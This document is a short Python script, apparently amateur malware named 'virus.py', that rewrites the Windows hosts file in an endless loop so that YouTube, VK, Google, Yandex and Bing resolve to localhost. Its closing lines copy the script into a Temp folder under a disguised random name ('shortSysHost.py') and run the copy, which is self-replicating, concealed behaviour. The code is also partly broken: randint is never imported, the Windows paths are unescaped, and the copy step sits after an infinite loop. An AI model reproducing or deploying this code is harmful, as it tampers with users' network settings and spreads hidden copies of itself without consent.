import time
from datetime import datetime
import getpass
import os
import random as r

start_time = datetime(datetime.now().year, datetime.now().month, datetime.now().day, 0)
finish_time = datetime(datetime.now().year, datetime.now().month, datetime.now().day, 23, 59)

print(start_time)
print(finish_time)

hosts = r'C:\Windows\System32\drivers\etc\hosts'
# hosts = '/etc/hosts'
redirect_url = '127.0.0.1'

blocked_sites = ['www.youtube.com', 'youtube.com', 'www.vk.com', 'vk.com', 'www.google.com', 'google.com', 'www.google.ru', 'google.ru', 'www.yandex.ru', 'yandex.ru', 'www.yandex.com', 'yandex.com', 'www.bing.com', 'bing.com', 'www.bing.ru', 'bing.ru']

while True:
    if start_time < datetime.now() < finish_time:
        #print('Доступ ограничен!')
        
        with open(hosts, 'r+') as file:
            src = file.read()
            
            for site in blocked_sites:
                if site in src:
                    pass
                else:
                    file.write(f'{redirect_url} {site}\n')
    else:
        with open(hosts, 'r+') as file:
            src = file.readlines()
            file.seek(0)
            
            for line in src:
                if not any(site in line for site in blocked_sites):
                    file.write(line)
            file.truncate()
        #print('Доступ открыт!')

user = getpass.getuser()
rand = randint(1, 999)

os.system('mkdir C:\Users\glebp\AppData\Local\Temp\672GFJA-U274IASE-FASDBHEULI-874YDGIKAOPFH')
new_f = open('virus.py', 'rb')
text = new_f.read()
new_f.close()
f = open(f'C:\Users\glebp\AppData\Local\Temp\672GFJA-U274IASE-FASDBHEULI-874YDGIKAOPFH\shortSysHost.py{rand}', 'a+')
f.write(text)
f.close()
os.system(f'C:/Users/glebp/AppData/Local/Programs/Python/Python310/python.exe C:\Users\glebp\AppData\Local\Temp\672GFJA-U274IASE-FASDBHEULI-874YDGIKAOPFH\shortSysHost.py{rand}')